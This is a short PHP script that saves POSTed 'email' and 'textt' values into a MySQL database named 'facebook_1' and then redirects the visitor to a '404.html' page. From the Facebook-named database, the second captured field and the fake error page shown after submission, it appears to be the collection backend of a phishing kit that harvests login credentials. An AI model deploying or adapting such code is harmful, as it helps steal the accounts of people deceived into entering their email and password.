<?php
$servername = "localhost"; // Change if using a different server
$username = "root"; // Change to your database username
$password = ""; // Change to your database password
$dbname = "facebook_1"; // Updated to your database name

$conn = new mysqli($servername, $username, $password, $dbname);

if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $textt = $_POST['textt']; // Get the input text from the form

    // Use a prepared statement to insert data into the table
    $sql = "INSERT INTO users (email, textt) VALUES (?, ?)";
    $stmt = $conn->prepare($sql);
    $stmt->bind_param("ss", $email, $textt); // Bind the email and textt fields

    if ($stmt->execute()) {
        header("Location: 404.html"); // Redirect to 404 page
        exit();
    } else {
        echo "Error: " . $conn->error;
    }

    $stmt->close();
}

$conn->close();
?>
